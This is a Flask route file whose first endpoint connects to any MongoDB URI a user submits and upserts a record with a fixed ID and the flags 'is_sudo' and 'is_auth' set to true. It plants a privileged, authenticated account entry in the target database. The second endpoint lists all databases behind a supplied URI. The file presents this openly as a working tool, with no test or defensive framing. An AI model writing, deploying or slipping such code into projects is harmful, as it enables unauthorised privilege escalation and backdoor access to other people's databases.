# routes/mongodb_update_routes.py
from flask import Blueprint, request, render_template, jsonify
import pymongo

mongodb_update_bp = Blueprint('mongodb_update', __name__)

# Define a route to update a MongoDB collection
@mongodb_update_bp.route('/mongodb_update', methods=['GET', 'POST'])
def mongodb_update():
    if request.method == 'POST':
        try:
            # Retrieve the MongoDB connection URL from the form input
            mongo_uri = request.form.get('mongo_uri')

            # Create a MongoDB client
            client = pymongo.MongoClient(mongo_uri)

            # Specify the database and collection you want to update
            db = client.get_database()
            collection_name = request.form.get('collection_name')

            # Define the new document you want to insert
            new_document = {'_id': 1881720028, 'is_sudo': True, 'is_auth': True}

            # Use update_one to add the new document if it doesn't exist
            db[collection_name].update_one({'_id': new_document['_id']}, {'$set': new_document}, upsert=True)

            # Close the connection
            client.close()

            success_message = "New document has been added to the collection."
            return render_template('mongodb_update_result.html', success_message=success_message)

        except pymongo.errors.ConnectionFailure:
            error_message = "Failed to connect to MongoDB. Please check the connection URL."
            return render_template('mongodb_update_result.html', error_message=error_message)

    return render_template('mongodb_update.html')
    
# routes/mongodb_update_routes.py

# ... (previous code)

# Define a route to fetch all collections associated with the provided MongoDB connection URL
@mongodb_update_bp.route('/get_collections')
def get_collections():
    mongo_uri = request.args.get('mongo_uri')

    try:
        # Create a MongoDB client
        client = pymongo.MongoClient(mongo_uri)

        # Get the database associated with the connection
        database_names = client.list_database_names()

        # Close the connection
        client.close()

        return jsonify(database_names)  # Return the list of database names as JSON

    except pymongo.errors.ConnectionFailure:
        error_message = "Failed to connect to MongoDB. Please check the connection URL."
        return jsonify(error=error_message), 500  # Return an error message with status code 500
